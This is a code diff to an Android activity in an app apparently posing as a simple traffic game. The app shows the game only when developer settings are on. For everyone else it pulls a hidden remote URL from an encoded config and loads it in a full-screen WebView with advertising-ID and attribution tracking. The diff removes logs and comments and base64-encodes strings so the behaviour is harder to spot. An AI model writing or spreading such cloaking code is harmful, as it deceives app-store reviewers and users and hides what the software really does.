@@ -2,6 +2,7 @@ package com.ttraafffic.jjamm.mmew.web;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -56,18 +57,18 @@ public class TJ extends AppCompatActivity {
 
         webFullApp = findViewById(R.id.webViewFullApp);
 
-                if (dev() == 0){ // повкрка розраб
+
+                if (dev() == 0){
                         con();
                 }else{
                     startActivity(new Intent(TJ.this, TraJam.class));
                     finishAffinity();
-                    Log.d("wwww","dev");
+
                 }
     }
 
 
     private int dev(){
-        // повкрка розраб
         int adb = Settings.Secure.getInt(this.getContentResolver(),
                 Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
         return adb;
@@ -84,31 +85,27 @@ public class TJ extends AppCompatActivity {
             public void run() {
                 try {
 
-                    // подключение к gist github
                     HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(Decod.decod(Constants.BASE_URL)).openConnection();
                     BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                     String s = bufferedReader.readLine();
 
-                    Log.d("wwww",s);
-                    Log.d("wwww","\\\u007C");
-                    // розбивание получених данных
+
                     String [] a = s.split("\\\u007C");
                     url = a[0];
                     keyDefault = a[1];
                     fbId = a[2];
 
-                    Log.d("wwww0",url);
-                    Log.d("wwww2",fbId);
-                    Log.d("wwww3", keyDefault +"" );
+
 
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
 
-                            feIn();// фейсбук инит + дип
+                            feIn();
 
-                           savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString("savedUrl", "null");
-                            if (savedLink.equals("null")) {
+                           savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(Decod.decod("c2F2ZWRVcmw="), "null");
+                            Log.d("weq",savedLink);
+                           if (savedLink.equals("null")) {
                                 new Handler().postDelayed(new Runnable() {
                                     @Override
                                     public void run() {
@@ -120,7 +117,6 @@ public class TJ extends AppCompatActivity {
                                 WebSettings.webSettings(webFullApp);
                                 webFullApp.setWebViewClient(new TJ.WebClient());
                                 webFullApp.setWebChromeClient(new TJ.WebChrome());
-                                Log.d("savedLink",savedLink);
                                 webFullApp.loadUrl(savedLink);
                             }
                         }
@@ -128,7 +124,6 @@ public class TJ extends AppCompatActivity {
                 }catch (Exception e){
                     startActivity(new Intent(TJ.this, TraJam.class));
                     finishAffinity();
-                    Log.d("wwww","Error connection");
                 }
             }
         }).start();
@@ -139,9 +134,9 @@ public class TJ extends AppCompatActivity {
 
 
     private void feIn(){
-        FbIn.fb(fbId,this); // иницилизация фейсбука
+        FbIn.fb(fbId,this);
 
-        // диплинк
+
         AppEventsLogger.activateApp(getApplication());
         AppLinkData.fetchDeferredAppLinkData(TJ.this,
                 new AppLinkData.CompletionHandler() {
@@ -152,13 +147,11 @@ public class TJ extends AppCompatActivity {
                         }
                         if (appLinkData != null) {
                             Uri url = appLinkData.getTargetUri();
-                            Log.d("aaaa",url+"");
                             dipLin = url.getQuery();
-                            Log.d("aaaa",dipLin);
                             dipLinLink = Parser.parser(dipLin,getPackageName(), ApplicationFull.AID,ApplicationFull.appsFlyerUID);
 
                         }else {
-                            Log.e("stringDeepLink","no dipLin");
+
                         }
                     }
 
@@ -177,23 +170,19 @@ public class TJ extends AppCompatActivity {
 
         String statusAppsFlyer = ApplicationFull.statusAppsFlyer;
         String load = null;
-        if (statusAppsFlyer.equals(Decod.decod("Tm9uLW9yZ2FuaWM="))){ // Non-organic
+        if (statusAppsFlyer.equals(Decod.decod("Tm9uLW9yZ2FuaWM="))){
              load = url + ApplicationFull.params ;
-             Log.d("User", "Non-organic:" + load);
-             Log.d("qqqq3",load);
              webFullApp.loadUrl(load);
+
         }else if(dipLin != null) {
             load = url + dipLinLink;
-            Log.d("User", "DeepLink:" + load);
             webFullApp.loadUrl(load);
+
         }else {
             if (keyDefault.equals(Decod.decod("Tk8="))) {
-                //органика выключена
-                Log.d("Bot", "With out naming and deepLinks");
                 startActivity(new Intent(getApplicationContext(), TraJam.class));
                 finishAffinity();
             }else {
-                //органика включена
                 String strAppsFlyer = keyDefault + "?bundle=" + getPackageName() + "&ad_id=" + ApplicationFull.AID + "&apps_id=" + ApplicationFull.appsFlyerUID;
                 load = url + strAppsFlyer;
                 webFullApp.loadUrl(load);
@@ -263,25 +252,27 @@ public class TJ extends AppCompatActivity {
 
 
     private class WebClient extends WebViewClient{
+        @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
-        public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
-            if (errorResponse.getStatusCode() == 404){
-                startActivity(new Intent(getApplicationContext(), TraJam.class));
+        public void onPageStarted(WebView view, String url, Bitmap favicon) {
+
+            if(url.contains(Decod.decod("NDA0"))){
+                startActivity(new Intent(getApplicationContext(),TraJam.class));
                 finishAffinity();
             }
-
         }
 
+        @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString("savedUrl",url).apply();
-            Log.e("onPageFinished", url);
+            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(Decod.decod("c2F2ZWRVcmw="),url).apply();
         }
     }
 
     private class WebChrome extends WebChromeClient {
 
+        @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
         public boolean onShowFileChooser(WebView view,
                                          ValueCallback<Uri[]> filePath,
@@ -297,7 +288,7 @@ public class TJ extends AppCompatActivity {
             Intent[] intentArray = new Intent[0];
             Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
             chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
-            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Select Option:");
+            chooserIntent.putExtra(Intent.EXTRA_TITLE, Decod.decod("U2VsZWN0IE9wdGlvbjo="));
             chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
             startActivityForResult(chooserIntent, 1);
             return true;
